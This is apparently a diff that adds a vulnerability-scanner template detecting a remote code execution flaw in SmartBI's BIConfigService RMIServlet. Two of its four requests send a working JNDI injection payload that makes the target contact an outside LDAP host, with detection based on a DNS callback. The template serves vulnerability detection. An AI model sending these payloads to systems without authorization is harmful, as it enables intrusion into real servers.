@@ -1,0 +1,91 @@
+id: smartbi-db2-biconfigservice-rce
+
+info:
+  name: SmartBI DB2 BIConfigService Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    SmartBI versions prior to v10.5.8 (20221125) are vulnerable to a DB2 command execution vulnerability.
+    Exploitation requires administrative privileges.
+  reference:
+    - https://www.smartbi.com.cn/patchinfo
+
+variables:
+  reverseDomain: "{{interactsh-url}}"
+
+http:
+  - id: r1
+    method: POST
+    path:
+      - /smartbi/vision/RMIServlet
+    headers:
+      Content-Type: application/x-www-form-urlencoded;charset=UTF-8
+    body: |
+      className=BIConfigService&methodName=testConnection&params=["DB2_V9","","localhost:6688",":clientRerouteServerListJNDIName=","admin","",{"dameng6":false,"secret-key":null,"secret-key-encrypt-type":"0","token-timeout":"60","require-password":"false"}]
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "stackTrace"
+        part: body
+      - type: regex
+        regex:
+          - "CLIENT_USER_NOT_LOGIN"
+          - "会存在RCE的安全漏洞"
+        part: body
+        negative: true
+
+  - id: r2
+    method: POST
+    path:
+      - /smartbi/vision/RMIServlet
+    headers:
+      Content-Type: application/x-www-form-urlencoded;charset=UTF-8
+    body: |
+      className=BIConfigService&methodName=testConnection&params=["DB2_V9","","localhost:6688","BLUDB:clientRerouteServerListJNDIName=ldap://{{reverseDomain}}:1389/#Exploit","admin","",{"dameng6":false,"secret-key":null,"secret-key-encrypt-type":"0","token-timeout":"60","require-password":"false"}]
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - dns
+
+  - id: r3
+    method: POST
+    path:
+      - /vision/RMIServlet
+    headers:
+      Content-Type: application/x-www-form-urlencoded;charset=UTF-8
+    body: |
+      className=BIConfigService&methodName=testConnection&params=["DB2_V9","","localhost:6688",":clientRerouteServerListJNDIName=","admin","",{"dameng6":false,"secret-key":null,"secret-key-encrypt-type":"0","token-timeout":"60","require-password":"false"}]
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "stackTrace"
+        part: body
+      - type: regex
+        regex:
+          - "CLIENT_USER_NOT_LOGIN"
+          - "会存在RCE的安全漏洞"
+        part: body
+        negative: true
+
+  - id: r4
+    method: POST
+    path:
+      - /vision/RMIServlet
+    headers:
+      Content-Type: application/x-www-form-urlencoded;charset=UTF-8
+    body: |
+      className=BIConfigService&methodName=testConnection&params=["DB2_V9","","localhost:6688","BLUDB:clientRerouteServerListJNDIName=ldap://{{reverseDomain}}:1389/#Exploit","admin","",{"dameng6":false,"secret-key":null,"secret-key-encrypt-type":"0","token-timeout":"60","require-password":"false"}]
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - dns
